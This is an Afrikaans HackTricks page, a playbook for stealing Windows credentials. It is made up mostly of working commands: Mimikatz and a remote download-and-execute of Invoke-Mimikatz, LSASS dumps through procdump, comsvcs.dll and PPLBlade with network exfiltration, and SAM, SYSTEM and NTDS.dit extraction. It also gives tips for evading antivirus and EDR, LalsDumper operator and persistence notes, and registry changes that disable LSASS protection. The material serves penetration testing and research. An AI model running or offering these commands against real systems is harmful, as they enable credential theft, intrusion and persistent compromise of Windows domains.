# Diefstal van Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen op** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Lees hier oor 'n paar moontlike credentials-beskermings.**](credentials-protections.md) **Hierdie beskermings kan verhoed dat Mimikatz sekere credentials onttrek.**

## Credentials met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het **om na wagwoorde en hashes binne die slagoffer te soek**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Om AV te omseil

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n regmatige Microsoft-instrument is**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie hulpmiddel gebruik om **dump the lsass process**, **download the dump** en **extract** die **credentials locally** uit die dump.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Hierdie proses word outomaties met [SprayKatz](https://github.com/aas-n/spraykatz) gedoen: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Sommige **AV** kan die gebruik van **procdump.exe to dump lsass.exe** as **malicious** bespeur, dit is omdat hulle die string **"procdump.exe" and "lsass.exe"** **detecting**. Dit is dus **stealthier** om as **argument** die **PID** van lsass.exe aan procdump te **pass** in plaas van die **name lsass.exe.**

### Dumping lsass met **comsvcs.dll**

'n DLL genaamd **comsvcs.dll** gevind in `C:\Windows\System32` is verantwoordelik vir **dumping process memory** in die geval van 'n crash. Hierdie DLL sluit 'n **function** genaamd **`MiniDumpW`** in, ontwerp om met `rundll32.exe` aangeroep te word.\
Dit maak nie saak wat die eerste twee arguments is nie, maar die derde een is in drie komponente verdeel. Die process ID wat gedump moet word vorm die eerste komponent, die dump file location verteenwoordig die tweede, en die derde komponent is streng die woord **full**. Geen alternatiewe opsies bestaan nie.\
Na ontleding van hierdie drie komponente begin die DLL om die dump file te skep en die gespesifiseerde proses se geheue in hierdie lêer oor te dra.\
Die gebruik van die **comsvcs.dll** is haalbaar vir die dumping van die lsass proses, en verwyder dus die behoefte om procdump op te laai en uit te voer. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Die volgende opdrag word vir uitvoering gebruik:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dump van lsass met Taakbestuurder**

1. Regs-klik op die Taakbalk en klik op Taakbestuurder
2. Klik op Meer besonderhede
3. Soek die proses "Local Security Authority Process" in die Processes-oortjie
4. Regs-klik op die proses "Local Security Authority Process" en klik op "Create dump file".

### Dump van lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêre wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Protected Process Dumper Tool wat die obfuskering van memory dumps ondersteun en dit na remote workstations oordra sonder om dit op die disk te skryf.

**Belangrike funksies**:

1. Omseiling van PPL-beskerming
2. Obfuskering van memory dump-lêers om Defender se signature-based detection-meganismes te ontduik
3. Oplaai van memory dumps met RAW- en SMB-uploadmetodes sonder om dit op die disk te skryf (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-gebaseerde LSASS dumping sonder MiniDumpWriteDump

Ink Dragon lewer 'n drie-stadium dumper genaamd **LalsDumper** wat nooit `MiniDumpWriteDump` aanroep nie, so EDR-hooks op daardie API word nooit geaktiveer nie:

1. **Stage 1 loader (`lals.exe`)** – soek `fdp.dll` na 'n plekhouer wat uit 32 kleinletters `d` bestaan, oorskryf dit met die absolute pad na `rtu.txt`, stoor die gepatste DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as 'n nuwe Security Support Provider (SSP) te laai.
2. **Stage 2 inside LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke byte met `0x20`, en map die gedekodeerde blob in geheue voordat uitvoering oorgedra word.
3. **Stage 3 dumper** – die gemapte payload implementeer MiniDump-logika opnuut deur gebruik te maak van **direct syscalls** opgelos uit gehashte API-name (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). 'n Toegewyde export genaamd `Tom` maak `%TEMP%\<pid>.ddt` oop, stream 'n gecomprimeerde LSASS-dump in die lêer, en sluit die handle sodat eksfiltrasie later kan plaasvind.

Operator notes:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll`, en `rtu.txt` in dieselfde gids. Stage 1 skryf die hard-gekodeerde plekhouer oor met die absolute pad na `rtu.txt`, so om dit te skei breek die ketting.
* Registrasie gebeur deur `nfdp` by te voeg by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Jy kan daardie waarde self instel sodat LSASS die SSP by elke opstart herblaai.
* `%TEMP%\*.ddt` lêers is gecomprimeerde dumps. Decompress plaaslik, en voer dit dan na Mimikatz/Volatility vir credential extraction.
* Om `lals.exe` te laat loop vereis admin/SeTcb-regte sodat `AddSecurityPackageA` kan slaag; sodra die oproep terugkeer, laai LSASS die vreemde SSP deursigtig en voer Stage 2 uit.
* Verwydering van die DLL van skyf verwyder dit nie uit LSASS nie. Verwyder óf die registerinskrywing en herbegin LSASS (reboot) óf laat dit vir langtermyn persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit van teiken DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit wagwoordgeskiedenis van die teiken-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet attribuut vir elke NTDS.dit-rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM_. Maar **jy kan hulle nie net op 'n normale manier kopieer nie** omdat hulle beskerm is.

### From Registry

Die maklikste manier om daardie lêers te steal is om 'n kopie van die Registry te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers na jou Kali-masjien af en **haal die hashes uit** met:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan kopieë van beskermde lêers maak met hierdie diens. Jy moet Administrator wees.

#### Using vssadmin

Die vssadmin binary is slegs beskikbaar in Windows Server-weergawes
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde doen vanaf **Powershell**. Dit is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word is "C:" en dit word gestoor in C:\users\Public), maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie te maak van SAM, SYSTEM en ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory inlogbewyse - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory**, en bevat belangrike data oor gebruiker-objekte, groepe, en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** database en lê by **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle onderhou:

- **Data Table**: Hierdie tabel stoor besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou rekord van verhoudings, soos groeplidmaatskappe.
- **SD Table**: **Security descriptors** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoorde objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan 'n **gedeelte** van die **NTDS.dit**-lêer in die geheue van **`lsass`** gevind word (jy kan waarskynlik die mees onlangse geraadpleegde data vind weens prestasieverbetering deur die gebruik van 'n **cache**).

#### Ontsleuteling van die hashes in NTDS.dit

Die hash is 3 keer gesifreer:

1. Ontsleutel die Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. Ontsleutel die **hash** met **PEK** en **RC4**.
3. Ontsleutel die **hash** met **DES**.

**PEK** het dieselfde waarde in **elke domeincontroller**, maar dit is gesifreer binne die **NTDS.dit**-lêer met die **BOOTKEY** van die **SYSTEM**-lêer van die domeincontroller (verskil tussen domeincontrollers). Dit is hoekom, om die credentials uit die NTDS.dit-lêer te kry, **het jy die lêers NTDS.dit en SYSTEM nodig** (_C:\Windows\System32\config\SYSTEM_).

### Kopieer NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system) truuk gebruik om die **ntds.dit** lêer te kopieer. Onthou dat jy ook 'n kopie van die **SYSTEM file** nodig sal hê (weer, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) truuk).

### **Uittrekking van hashes uit NTDS.dit**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** verkry het, kan jy gereedskap soos _secretsdump.py_ gebruik om die **hashes** te onttrek:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan hulle ook **outomaties onttrek** met 'n geldige domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) te onttrek.

Uiteindelik kan jy ook die **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject` gebruik

### **Onttrekking van domeinobjekte uit NTDS.dit na 'n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na 'n SQLite-databasis onttrek word. Nie net secrets word onttrek nie, maar ook die volledige objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel, maar maak ontsleuteling van geheime moontlik (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Saam met ander inligting word die volgende data uitgehaal: gebruikers- en masjienrekeninge met hul hashes, UAC-vlae, tydstempel vir laaste aanmelding en wagwoordverandering, rekeningbeskrywings, name, UPN, SPN, groepe en rekursiewe lidmaatskappe, boom van organisatoriese eenhede en lidmaatskap, vertroude domeine met trust-tipe, rigting en attribuut(e)...

## Lazagne

Laai die binary af vanaf [here](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binary gebruik om credentials uit verskeie software te onttrek.
```
lazagne.exe all
```
## Ander gereedskap om credentials uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie hulpmiddel kan gebruik word om credentials uit die geheue te onttrek.  
Laai dit af van: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Haal credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en voer dit net **uit** en die wagwoorde sal onttrek word.

## Ontgin onaktiewe RDP-sessies en verswak sekuriteitskontroles

Ink Dragon’s FinalDraft RAT bevat 'n `DumpRDPHistory` tasker waarvan die tegnieke handig is vir enige red-teamer:

### DumpRDPHistory-styl telemetrie-insameling

* **Outbound RDP targets** – ontleed elke gebruikers hive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subkey stoor die servernaam, `UsernameHint`, en die laaste schrijftydstempel. Jy kan FinalDraft se logika replikateer met PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – doen 'n navraag op die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log vir Event IDs **21** (successful logon) en **25** (disconnect) om te bepaal wie die boks geadministreer het:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie nog bestaan. CredSSP + NTLM fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM herhaal kan word om `NTDS.dit` te gryp of persistentie op domain controllers te vestig.

### Register-teruggraderings wat deur FinalDraft geteiken word
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Instelling `DisableRestrictedAdmin=1` dwing volledige credential/ticket-hergebruik tydens RDP af, en maak pass-the-hash-styl pivots moontlik.
* `LocalAccountTokenFilterPolicy=1` skakel UAC token filtering uit sodat local admins onbeperkte tokens oor die netwerk ontvang.
* `DSRMAdminLogonBehavior=2` laat die DSRM administrator aanmeld terwyl die DC aanlyn is, wat attackers nog 'n built-in high-privilege account gee.
* `RunAsPPL=0` verwyder LSASS PPL protections, wat geheue-toegang triviaal maak vir dumpers soos LalsDumper.

## References

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
